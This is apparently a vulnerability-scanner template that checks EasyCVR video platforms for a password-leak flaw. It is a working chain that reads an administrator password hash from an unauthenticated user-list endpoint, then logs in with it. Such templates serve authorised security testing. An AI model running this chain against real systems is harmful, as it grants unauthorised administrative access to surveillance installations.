id: poc-yaml-easy-cvr-password-leak
info:
  name: EasyCVR Password Leak Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: info-leak,easycvr
http:
  - raw:
      - |
        GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
        Host: {{BaseURL}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "easycvr"
          - "Administrator"
    extractors:
      - type: regex
        name: passwd
        part: body
        regex:
          - "(?P<passwd>[a-z0-9]{32})"
        internal: true
  - raw:
      - |
        GET /api/v1/login?_t=1698724339&username=easycvr&password={{passwd}} HTTP/1.1
        Host: {{BaseURL}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Success OK"
          - "Token"
